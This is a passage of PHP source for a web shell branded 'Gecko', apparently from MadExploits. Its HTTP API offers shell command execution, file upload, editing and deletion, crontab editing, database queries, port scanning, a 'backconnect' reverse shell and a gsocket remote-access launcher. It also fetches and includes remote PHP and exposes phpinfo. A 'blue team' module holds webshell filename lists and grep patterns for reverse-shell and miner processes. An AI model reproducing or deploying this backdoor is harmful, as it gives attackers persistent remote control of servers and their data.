            $line = trim($line);
            if ($line === '' || $line[0] === '#') continue;
            $ln++;
            $flags = array();
            foreach ($suspicious as $pat) {
                if (preg_match($pat, $line)) $flags[] = 'SUSPICIOUS';
            }
            $prefix = empty($flags) ? '[OK]   ' : '[WARN] ';
            $lines[] = $prefix . $line;
        }
        if ($ln === 0) $lines[] = '(no active cron entries)';
    }
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if (!$isWin) {
        $etc = runTerminal('ls -la /etc/cron* 2>/dev/null; grep -rH . /etc/cron.d/ /etc/cron.daily/ 2>/dev/null | head -30', $baseDir);
        $lines[] = '';
        $lines[] = '=== /etc/cron* (sample) ===';
        $lines[] = trim($etc['output']);
    }
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btLogAudit($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== AUTH / SECURITY LOG AUDIT ===', '');
    if ($isWin) {
        $out = runTerminal('wevtutil qe Security /c:20 /rd:true /f:text 2>nul', $baseDir);
        $lines[] = trim($out['output']) ?: '(Windows event query unavailable)';
    } else {
        $cmds = array(
            'Failed SSH/auth (last 40)' => 'grep -iE "Failed password|Invalid user|authentication failure|refused connect" /var/log/auth.log /var/log/secure 2>/dev/null | tail -40',
            'sudo usage (last 20)' => 'grep -i sudo /var/log/auth.log /var/log/secure 2>/dev/null | tail -20',
            'Web server errors (last 20)' => 'grep -iE "eval|base64|shell|cmd=|/etc/passwd" /var/log/apache2/error.log /var/log/httpd/error_log /var/log/nginx/error.log 2>/dev/null | tail -20',
        );
        foreach ($cmds as $label => $cmd) {
            $out = runTerminal($cmd, $baseDir);
            $lines[] = '--- ' . $label . ' ---';
            $lines[] = trim($out['output']) ?: '(no entries or log not accessible)';
            $lines[] = '';
        }
    }
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btIocScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $iocs = array('c99','r57','wso','b374k','shell','backdoor','cmd','uploader','alfa','indoxploit','mini','hack','exploit','webshell','c100','r00t','anonymous','leaf','marijuana','fox','upl');
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== IOC FILENAME HUNT ===', '');
    $found = 0;
    foreach ($roots as $root) {
        if (!$isWin) {
            $nameExpr = array();
            foreach ($iocs as $ioc) {
                $nameExpr[] = '-iname ' . escapeshellarg('*' . $ioc . '*.php');
                $nameExpr[] = '-iname ' . escapeshellarg('*' . $ioc . '*.phtml');
            }
            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth 8 \( ' . implode(' -o ', $nameExpr) . ' \) -type f 2>/dev/null | head -40';
            $out = runTerminal($cmd, $baseDir);
            if (trim($out['output']) !== '') {
                $lines[] = '--- ' . $root . ' ---';
                $lines[] = trim($out['output']);
                $found += substr_count($out['output'], "\n") + 1;
                $lines[] = '';
            }
        }
    }
    if ($found === 0) $lines[] = '(no IOC filename matches)';
    return array('ok' => true, 'output' => implode("\n", $lines), 'count' => $found);
}

function btSuspiciousProcess($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $out = runTerminal('tasklist /V', $baseDir);
    } else {
        $out = runTerminal('ps auxww 2>/dev/null | grep -iE "nc |/dev/tcp|python -c|perl -e|bash -i|gsocket|cryptominer|xmrig|masscan|sqlmap" | grep -v grep', $baseDir);
        if (trim($out['output']) === '') {
            $out['output'] = "(no suspicious process patterns matched)\n\nFull process list (top 30):\n" . runTerminal('ps auxww 2>/dev/null | head -30', $baseDir)['output'];
        }
    }
    return array('ok' => true, 'output' => "=== SUSPICIOUS PROCESS SCAN ===\n\n" . $out['output']);
}

function btFullAudit($baseDir, $scanPath)
{
    @set_time_limit(600);
    $parts = array();
    $r1 = btWebshellScan($baseDir, $scanPath, true);
    $parts[] = $r1['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btRecentChanges($baseDir, $scanPath, 7)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btWritableScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btHiddenScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btCronAudit($baseDir)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btIocScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btSuspiciousProcess($baseDir)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btLogAudit($baseDir)['output'];
    return array(
        'ok' => true,
        'output' => implode("\n\n", $parts),
        'count' => isset($r1['count']) ? $r1['count'] : 0,
        'critical' => isset($r1['critical']) ? $r1['critical'] : 0,
    );
}

function runBlueTool($tool, $input, $baseDir)
{
    $tool = strtolower(trim((string)$tool));
    $scanPath = (string)_v($input, 'path', '');
    $days = (int)_v($input, 'days', 7);
    switch ($tool) {
        case 'backdoor':
            $aggressive = _v($input, 'aggressive', true);
            return btWebshellScan($baseDir, $scanPath, $aggressive);
        case 'delete_threats':
            $paths = _v($input, 'paths', array());
            if (is_string($paths)) {
                $decoded = json_decode($paths, true);
                $paths = is_array($decoded) ? $decoded : array($paths);
            }
            return btDeleteThreats($baseDir, $paths);
        case 'quarantine_list':
            return btListQuarantine($baseDir);
        case 'restore_threats':
            $ids = _v($input, 'ids', array());
            if (is_string($ids)) {
                $decoded = json_decode($ids, true);
                $ids = is_array($decoded) ? $decoded : array($ids);
            }
            return btRestoreThreats($baseDir, $ids);
        case 'fullaudit':
            return btFullAudit($baseDir, $scanPath);
        case 'recent':
            return btRecentChanges($baseDir, $scanPath, $days);
        case 'writable':
            return btWritableScan($baseDir, $scanPath);
        case 'hidden':
            return btHiddenScan($baseDir, $scanPath);
        case 'cron':
            return btCronAudit($baseDir);
        case 'logs':
            return btLogAudit($baseDir);
        case 'ioc':
            return btIocScan($baseDir, $scanPath);
        case 'process':
            return btSuspiciousProcess($baseDir);
        default:
            return array('ok' => false, 'error' => 'Unknown blue team tool');
    }
}

function dbMakePdo($type, $host, $port, $user, $pass, $db)
{
    $type = strtolower(trim((string)$type));
    $host = trim((string)$host);
    $user = (string)$user;
    $pass = (string)$pass;
    $db = trim((string)$db);
    $port = (int)$port;
    if (!class_exists('PDO')) {
        return array('ok' => false, 'error' => 'PDO extension not available');
    }
    try {
        if ($type === 'sqlite') {
            if ($db === '') {
                return array('ok' => false, 'error' => 'Database file path required');
            }
            $pdo = new PDO('sqlite:' . $db);
        } elseif ($type === 'mysql') {
            if ($host === '') $host = '127.0.0.1';
            if ($port <= 0) $port = 3306;
            $dsn = 'mysql:host=' . $host . ';port=' . $port . ';dbname=' . $db . ';charset=utf8mb4';
            $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } elseif ($type === 'pgsql') {
            if ($host === '') $host = '127.0.0.1';
            if ($port <= 0) $port = 5432;
            $dsn = 'pgsql:host=' . $host . ';port=' . $port . ';dbname=' . $db;
            $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } else {
            return array('ok' => false, 'error' => 'Unsupported DB type');
        }
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return array('ok' => true, 'pdo' => $pdo);
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

function dbRunQuery($type, $host, $port, $user, $pass, $db, $sql)
{
    $sql = trim((string)$sql);
    if ($sql === '') {
        return array('ok' => false, 'error' => 'Empty query');
    }
    $conn = dbMakePdo($type, $host, $port, $user, $pass, $db);
    if (!$conn['ok']) return $conn;
    /** @var PDO $pdo */
    $pdo = $conn['pdo'];
    try {
        $stmt = $pdo->query($sql);
        if ($stmt === false) {
            return array('ok' => true, 'type' => 'exec', 'affected' => $pdo->lastInsertId(), 'message' => 'Query executed');
        }
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $cols = array();
        if (!empty($rows)) {
            $cols = array_keys($rows[0]);
        } else {
            $colCount = $stmt->columnCount();
            for ($i = 0; $i < $colCount; $i++) {
                $meta = $stmt->getColumnMeta($i);
                if ($meta && isset($meta['name'])) $cols[] = $meta['name'];
            }
        }
        return array('ok' => true, 'type' => 'select', 'columns' => $cols, 'rows' => $rows, 'count' => count($rows));
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

function dbListTables($type, $host, $port, $user, $pass, $db)
{
    $conn = dbMakePdo($type, $host, $port, $user, $pass, $db);
    if (!$conn['ok']) return $conn;
    /** @var PDO $pdo */
    $pdo = $conn['pdo'];
    $type = strtolower(trim((string)$type));
    try {
        if ($type === 'mysql') {
            $stmt = $pdo->query('SHOW TABLES');
        } elseif ($type === 'pgsql') {
            $stmt = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename");
        } elseif ($type === 'sqlite') {
            $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name");
        } else {
            return array('ok' => false, 'error' => 'Unsupported DB type');
        }
        $tables = array();
        while ($row = $stmt->fetch(PDO::FETCH_NUM)) {
            $tables[] = $row[0];
        }
        return array('ok' => true, 'tables' => $tables);
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

// Helper untuk akses array yang aman (pengganti operator ??)
function _v($arr, $key, $default = '') {
    return (isset($arr[$key]) && $arr[$key] !== null) ? $arr[$key] : $default;
}

// Handle download requests
if (isset($_GET['download'])) {
    $path = resolvePath($baseDir, (string)$_GET['download']);
    if (!$path || is_dir($path)) { http_response_code(404); exit('Not found'); }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($path) . '"');
    header('Content-Length: ' . filesize($path));
    readfile($path); exit;
}

// Handle inline view requests (image preview, raw text view)
if (isset($_GET['view'])) {
    $path = resolvePath($baseDir, (string)$_GET['view']);
    if (!$path || is_dir($path)) { http_response_code(404); exit('Not found'); }

    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mimes = array(
        'png'  => 'image/png',
        'jpg'  => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif'  => 'image/gif',
        'webp' => 'image/webp',
        'svg'  => 'image/svg+xml',
        'ico'  => 'image/x-icon',
        'bmp'  => 'image/bmp',
        'avif' => 'image/avif',
        'pdf'  => 'application/pdf',
    );
    $mime = isset($mimes[$ext]) ? $mimes[$ext] : 'application/octet-stream';

    header('Content-Type: ' . $mime);
    header('Content-Length: ' . filesize($path));
    header('X-Content-Type-Options: nosniff');
    header('Content-Disposition: inline; filename="' . basename($path) . '"');
    header('Cache-Control: private, max-age=300');
    readfile($path);
    exit;
}

// Adminer — single-file DB manager (cached locally)
if (isset($_GET['adminer'])) {
    $adminerFile = __DIR__ . DIRECTORY_SEPARATOR . '.adminer.php';
    if (!is_file($adminerFile)) {
        $ctx = stream_context_create(array('http' => array('timeout' => 15)));
        $data = @file_get_contents('https://www.adminer.org/latest.php', false, $ctx);
        if ($data && strlen($data) > 1000) {
            @file_put_contents($adminerFile, $data);
        }
    }
    if (is_file($adminerFile)) {
        include $adminerFile;
        exit;
    }
    http_response_code(503);
    echo 'Adminer unavailable (download failed). Use built-in DB Manager.';
    exit;
}

if (isset($_GET['phpinfo'])) {
    phpinfo();
    exit;
}

// Handle API requests
if (isset($_GET['api'])) {
    $contentType = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
    $hasJson = strpos($contentType, 'application/json') !== false;

    if ($hasJson) {
        $raw = file_get_contents('php://input');
        if (!$raw) $raw = '{}';
        $decoded = json_decode($raw, true);
        $input = is_array($decoded) ? $decoded : array();
    } else {
        $input = $_POST;
    }

    $action = (string)_v($input, 'action', _v($_GET, 'action', 'list'));

    switch ($action) {
        case 'list':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));

            // Determine the directory to list
            if (preg_match('/^[A-Za-z]:\//', $rel)) {
                // Absolute Windows path
                $dir = str_replace('/', DIRECTORY_SEPARATOR, $rel);
            } elseif (strlen($rel) > 0 && $rel[0] === '/') {
                // Absolute Linux path
                $dir = $rel;
            } elseif ($rel === '') {
                // Default base directory
                $dir = $baseDir;
            } else {
                // Relative path
                $dir = resolvePath($baseDir, $rel);
            }

            if (!$dir || !is_dir($dir)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid directory: ' . $rel), 403);
            }

            jsonOut(array(
                'ok' => true,
                'path' => $rel,
                'entries' => listEntries($dir),
                'disk' => array(
                    'free' => @disk_free_space($dir),
                    'total' => @disk_total_space($dir),
                ),
            ));
            break;

        case 'read':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || is_dir($path)) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            $sz = filesize($path);
            if (!isTextFile($path) && (int)($sz ? $sz : 0) > 512000) jsonOut(array('ok' => false, 'error' => 'File too large or binary'), 400);
            jsonOut(array(
                'ok' => true,
                'content' => file_get_contents($path),
                'editable' => isTextFile($path),
                'size' => filesize($path),
                'modified' => filemtime($path),
            ));
            break;

        case 'save':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || is_dir($path)) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            if (file_put_contents($path, (string)_v($input, 'content', '')) === false) jsonOut(array('ok' => false, 'error' => 'Write failed'), 500);
            jsonOut(array('ok' => true, 'modified' => filemtime($path)));
            break;

        case 'mkdir':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $name = basename(str_replace('\\', '/', (string)_v($input, 'name', '')));
            if ($name === '' || preg_match('/[<>:"|?*\\\\\/]/', $name)) jsonOut(array('ok' => false, 'error' => 'Invalid name'), 400);
            $parent = resolvePath($baseDir, $rel);
            if (!$parent || !is_dir($parent)) jsonOut(array('ok' => false, 'error' => 'Invalid directory'), 403);
            $new = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($new)) jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (!@mkdir($new, 0755)) jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'create_file':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $name = basename(str_replace('\\', '/', (string)_v($input, 'name', '')));
            if ($name === '' || preg_match('/[<>:"|?*\\\\\/]/', $name)) jsonOut(array('ok' => false, 'error' => 'Invalid name'), 400);
            $parent = resolvePath($baseDir, $rel);
            if (!$parent || !is_dir($parent)) jsonOut(array('ok' => false, 'error' => 'Invalid directory'), 403);
            $new = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($new)) jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (file_put_contents($new, (string)_v($input, 'content', '')) === false) jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'delete':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || $path === $baseDir) jsonOut(array('ok' => false, 'error' => 'Cannot delete'), 403);
            $ok = is_dir($path) ? @rmdir($path) : @unlink($path);
            if (!$ok) jsonOut(array('ok' => false, 'error' => 'Delete failed (folder must be empty)'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'rename':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            $newName = basename(str_replace('\\', '/', (string)_v($input, 'new_name', '')));
            if (!$path || $newName === '' || preg_match('/[<>:"|?*\\\\\/]/', $newName)) jsonOut(array('ok' => false, 'error' => 'Invalid request'), 400);
            $dest = dirname($path) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($dest)) jsonOut(array('ok' => false, 'error' => 'Name taken'), 409);
            if (!@rename($path, $dest)) jsonOut(array('ok' => false, 'error' => 'Rename failed'), 500);
            jsonOut(array('ok' => true, 'new_path' => ltrim(str_replace('\\', '/', substr($dest, strlen($baseDir))), '/')));
            break;

        case 'chmod':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            $permString = (string)_v($input, 'perm', '');
            if (!preg_match('/^[0-7]{3,4}$/', $permString)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid permission format. Use octal (e.g., 755 or 0644)'), 400);
            }
            $octalPerm = octdec($permString);
            if (!@chmod($path, (int)$octalPerm)) {
                jsonOut(array('ok' => false, 'error' => 'Failed to change permissions'), 500);
            }
            clearstatcache(true, $path);
            $newPerm = substr(sprintf('%o', fileperms($path)), -4);
            jsonOut(array('ok' => true, 'perm' => $newPerm));
            break;

        case 'upload':
            $rel = sanitizeRelPath((string)_v($_POST, 'path', ''));
            $parent = resolvePath($baseDir, $rel);

            if (!$parent || !is_dir($parent)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid directory: ' . $rel), 403);
            }

            if (empty($_FILES['file'])) {
                jsonOut(array('ok' => false, 'error' => 'No file uploaded'), 400);
            }

            $f = $_FILES['file'];
            if ($f['error'] !== UPLOAD_ERR_OK) {
                $errors = array(
                    UPLOAD_ERR_INI_SIZE   => 'File too large (server limit: ' . ini_get('upload_max_filesize') . ')',
                    UPLOAD_ERR_FORM_SIZE  => 'File too large (form limit)',
                    UPLOAD_ERR_PARTIAL    => 'File only partially uploaded',
                    UPLOAD_ERR_NO_FILE    => 'No file uploaded',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file',
                    UPLOAD_ERR_EXTENSION  => 'Upload blocked by extension',
                );
                $errorMsg = isset($errors[$f['error']]) ? $errors[$f['error']] : ('Unknown upload error (code: ' . $f['error'] . ')');
                jsonOut(array('ok' => false, 'error' => $errorMsg), 400);
            }

            $name = basename($f['name']);
            $name = preg_replace('/[<>:"|?*\\\\\/]/', '', $name);
            $name = trim($name);

            if ($name === '') {
                jsonOut(array('ok' => false, 'error' => 'Invalid filename'), 400);
            }

            $dest = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($dest)) {
                $info = pathinfo($name);
                $filename = isset($info['filename']) ? $info['filename'] : $name;
                $extension = isset($info['extension']) ? $info['extension'] : '';
                $name = $filename . '_' . time() . ($extension !== '' ? '.' . $extension : '');
                $dest = $parent . DIRECTORY_SEPARATOR . $name;
            }

            if (!move_uploaded_file($f['tmp_name'], $dest)) {
                jsonOut(array('ok' => false, 'error' => 'Failed to save file. Check folder permissions.'), 500);
            }

            @chmod($dest, 0644);
            jsonOut(array('ok' => true, 'name' => $name, 'message' => 'Upload successful'));
            break;

        case 'search':
            $query = trim((string)_v($input, 'query', ''));
            if ($query === '') jsonOut(array('ok' => true, 'results' => array()));
            $results = array(); $count = 0;
            searchFiles($baseDir, sanitizeRelPath((string)_v($input, 'path', '')), $query, $results, $count);
            jsonOut(array('ok' => true, 'results' => $results));
            break;

        case 'terminal':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $cwd = resolvePath($baseDir, $rel);
            if (!$cwd || !is_dir($cwd)) jsonOut(array('ok' => false, 'error' => 'Invalid cwd'), 403);
            $command = trim((string)_v($input, 'command', ''));
            if ($command === '') jsonOut(array('ok' => false, 'error' => 'Empty command'), 400);
            $result = runTerminal($command, $cwd);
            jsonOut(array('ok' => true, 'output' => $result['output'], 'exit_code' => $result['exit_code'], 'cwd' => $rel));
            break;

        case 'drives':
            $drives = array();
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                for ($i = 67; $i <= 90; $i++) {
                    $drive = chr($i) . ':/';
                    if (@is_dir($drive)) {
                        $free = @disk_free_space($drive);
                        $total = @disk_total_space($drive);
                        $drives[] = array(
                            'letter' => chr($i) . ':',
                            'path' => $drive,
                            'free' => $free ? $free : 0,
                            'total' => $total ? $total : 0,
                            'label' => chr($i) . ':\\',
                        );
                    }
                }
            } else {
                // Linux/Mac - show root and common paths
                $commonPaths = array(
                    '/' => 'Root (/)',
                    '/home' => 'Home (/home)',
                    '/var' => 'Var (/var)',
                    '/etc' => 'Etc (/etc)',
                    '/usr' => 'Usr (/usr)',
                    '/tmp' => 'Tmp (/tmp)',
                );

                foreach ($commonPaths as $path => $label) {
                    if (@is_dir($path)) {
                        $free = @disk_free_space($path);
                        $total = @disk_total_space($path);
                        $drives[] = array(
                            'letter' => $path,
                            'path' => $path,
                            'free' => $free ? $free : 0,
                            'total' => $total ? $total : 0,
                            'label' => $label,
                        );
                    }
                }

                // Add current document root
                if (@is_dir($baseDir) && $baseDir !== '/') {
                    $free = @disk_free_space($baseDir);
                    $total = @disk_total_space($baseDir);
                    $drives[] = array(
                        'letter' => $baseDir,
                        'path' => $baseDir,
                        'free' => $free ? $free : 0,
                        'total' => $total ? $total : 0,
                        'label' => 'Document Root: ' . basename($baseDir),
                    );
                }
            }
            jsonOut(array('ok' => true, 'drives' => $drives));
            break;

        case 'info':
            jsonOut(array(
                'ok' => true,
                'php' => PHP_VERSION,
                'os' => PHP_OS,
                'base' => $baseDir,
                'disk_free' => @disk_free_space($baseDir),
                'disk_total' => @disk_total_space($baseDir),
            ));
            break;

        case 'cron_list':
            $cron = getCrontab();
            jsonOut(array(
                'ok' => true,
                'content' => $cron['content'],
                'platform' => $cron['platform'],
                'editable' => $cron['editable'],
            ));
            break;

        case 'cron_save':
            $content = (string)_v($input, 'content', '');
            $result = setCrontab($content);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut(array('ok' => true));
            break;

        case 'portscan':
            $host = trim((string)_v($input, 'host', '127.0.0.1'));
            $ports = trim((string)_v($input, 'ports', '21,22,25,80,443,3306,8080'));
            $timeout = (int)_v($input, 'timeout', 1);
            $result = scanPorts($host, $ports, $timeout);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'backconnect':
            $ip = trim((string)_v($input, 'ip', ''));
            $port = (int)_v($input, 'port', 4444);
            $method = (string)_v($input, 'method', 'bash');
            $result = startBackconnect($ip, $port, $method);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'gsocket':
            @set_time_limit(1800);
            @ini_set('max_execution_time', '1800');
            $method = (string)_v($input, 'method', 'curl');
            $result = runGsocket($method);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'db_tables':
            $result = dbListTables(
                (string)_v($input, 'type', 'mysql'),
                (string)_v($input, 'host', '127.0.0.1'),
                (int)_v($input, 'port', 3306),
                (string)_v($input, 'user', 'root'),
                (string)_v($input, 'pass', ''),
                (string)_v($input, 'db', '')
            );
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'db_query':
            $result = dbRunQuery(
                (string)_v($input, 'type', 'mysql'),
                (string)_v($input, 'host', '127.0.0.1'),
                (int)_v($input, 'port', 3306),
                (string)_v($input, 'user', 'root'),
                (string)_v($input, 'pass', ''),
                (string)_v($input, 'db', ''),
                (string)_v($input, 'sql', '')
            );
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'sec_tool':
            @set_time_limit(120);
            $tool = (string)_v($input, 'tool', 'recon');
            $result = runSecTool($tool, $input, $baseDir);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_tool':
            @set_time_limit(600);
            @ini_set('max_execution_time', '600');
            $tool = (string)_v($input, 'tool', 'backdoor');
            $result = runBlueTool($tool, $input, $baseDir);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_delete':
            $paths = _v($input, 'paths', array());
            if (is_string($paths)) {
                $decoded = json_decode($paths, true);
                $paths = is_array($decoded) ? $decoded : array($paths);
            }
            $result = btDeleteThreats($baseDir, $paths);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_quarantine_list':
            $result = btListQuarantine($baseDir);
            jsonOut($result);
            break;

        case 'blue_restore':
            $ids = _v($input, 'ids', array());
            if (is_string($ids)) {
                $decoded = json_decode($ids, true);
                $ids = is_array($decoded) ? $decoded : array($ids);
            }
            $result = btRestoreThreats($baseDir, $ids);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        default:
            jsonOut(array('ok' => false, 'error' => 'Unknown action'), 400);
    }
    exit;
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Gecko · <?= $_SERVER['SERVER_NAME'] ?> </title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,300;0,14..32,400;0,14..32,500;0,14..32,600;0,14..32,700;1,14..32,400&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ─── DESIGN TOKENS ───────────────────────────────────────────── */
/*  ◆  NOIR GOLD × LUXE DARK  ◆
    Ultra-deep ink, warm champagne gold accent, soft pearl text. */
:root {
  /* Ink palette — true noir, near-black with subtle warm undertone */
  --ink0: #050608;
  --ink1: #0a0b0e;
  --ink2: #101216;
  --ink3: #161920;
  --ink4: #1f232b;
  --ink5: #2a2f38;
  --ink6: #424754;
  --ink-tint: rgba(245,185,66,.020);

  /* Primary accent — Champagne Gold */
  --jade:     #f5b942;
  --jade-hi:  #ffd76e;
  --jade-lo:  #d4961f;
  --jade-dk:  #a8730e;
  --jade-bg:  rgba(245,185,66,.10);
  --jade-bd:  rgba(245,185,66,.24);
  --jade-bd2: rgba(245,185,66,.42);

  /* Semantic — warm-toned */
  --red:     #f87171;
  --red-bg:  rgba(248,113,113,.10);
  --red-bd:  rgba(248,113,113,.22);
  --amber:   #d4961f;
  --amber-bg:rgba(212,150,31,.12);
  --blue:    #79c0ff;
  --blue-bg: rgba(121,192,255,.10);
  --pink:    #ff8e8e;
  --pink-bg: rgba(255,142,142,.08);

  /* Text scale — pearl on noir */
  --tx:  #f5f1e8;
  --tx2: #d8d3c4;
  --tx3: #8a8578;
  --tx4: #61605a;

  /* Border */
  --bd:   rgba(245,185,66,.14);
  --bd2:  rgba(245,241,232,.06);
  --bd3:  rgba(245,241,232,.04);

  /* Radii */
  --r4: 4px; --r6: 6px; --r8: 8px; --r10: 10px; --r12: 12px; --r14: 14px; --r16: 16px; --r20: 20px;

  /* Type */
  --sans: "Inter", -apple-system, system-ui, sans-serif;
  --mono: "JetBrains Mono", "Fira Code", "SF Mono", Consolas, monospace;

  /* Shadows — layered for depth, no large blurs */
  --s0:  0 1px 0 rgba(255,255,255,.02) inset, 0 1px 2px rgba(0,0,0,.3);
  --s1:  0 1px 3px rgba(0,0,0,.4), 0 1px 2px rgba(0,0,0,.25);
  --s2:  0 6px 20px rgba(0,0,0,.45), 0 2px 6px rgba(0,0,0,.3);
  --s3:  0 18px 50px rgba(0,0,0,.55), 0 6px 16px rgba(0,0,0,.4);
  --s-jade: 0 0 0 1px var(--jade-bd), 0 4px 16px rgba(245,185,66,.24);
  --s-jade-soft: 0 0 0 3px var(--jade-bg);

  /* Layout */
  --topbar-h: 60px;
  --sidebar-w: 240px;
  --statusbar-h: 32px;

  /* Easing */
  --ease:    cubic-bezier(.4,0,.2,1);
  --ease-out: cubic-bezier(.2,.8,.2,1);
  --spring:  cubic-bezier(.34,1.3,.64,1);
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: .01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: .01ms !important;
    scroll-behavior: auto !important;
  }
}


/* ─── RESET ───────────────────────────────────────────────────── */
*,*::before,*::after { box-sizing: border-box; margin: 0; padding: 0 }
html, body { height: 100%; overflow: hidden }
body {
  font-family: var(--sans);
  font-size: 13.5px;
  line-height: 1.5;
  color: var(--tx);
  background: var(--ink0);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-rendering: optimizeLegibility;
  font-feature-settings: "cv02","cv03","cv04","cv11";
}
button, input, textarea, select { font: inherit; color: inherit; letter-spacing: inherit }
button { -webkit-tap-highlight-color: transparent }
a { color: var(--jade); text-decoration: none }

/* ─── ACCESSIBILITY — focus rings ──────────────────────────────── */
:focus-visible { outline: 2px solid var(--jade); outline-offset: 2px; border-radius: 4px }
button:focus-visible, .bc-btn:focus-visible, .ico-btn:focus-visible { outline-offset: 1px }

/* ─── SCROLLBAR — global subtle ───────────────────────────────── */
::-webkit-scrollbar { width: 9px; height: 9px }
::-webkit-scrollbar-track { background: transparent }
::-webkit-scrollbar-thumb {
  background: var(--ink5);
  border-radius: 99px;
  border: 2px solid transparent;
  background-clip: content-box;
}
::-webkit-scrollbar-thumb:hover { background: var(--ink6); background-clip: content-box; border: 2px solid transparent }

/* ─── PANEL BACKGROUND IMAGE (decorative) ─────────────────────── */
.panel { position: relative }
.panel::before {
  content: "";
  position: absolute;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  width: 95%; max-width: 820px; height: 820px;
  background: url('https://raw.githubusercontent.com/MadExploits/GECKO-FILE-MANAGER/refs/heads/main/image.png') center/contain no-repeat;
  opacity: .035;
  pointer-events: none;
  z-index: 0;
}
.tbl-head, .flist, .grid-wrap, .empty { position: relative; z-index: 1 }

/* ─── AMBIENT BACKGROUND — deep ocean glow, no filter ────────── */
.bg-mesh {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background:
    radial-gradient(ellipse 900px 600px at 8% -5%,  rgba(245,185,66,.10) 0%, transparent 60%),
    radial-gradient(ellipse 700px 500px at 100% 102%, rgba(168,115,14,.08) 0%, transparent 60%),
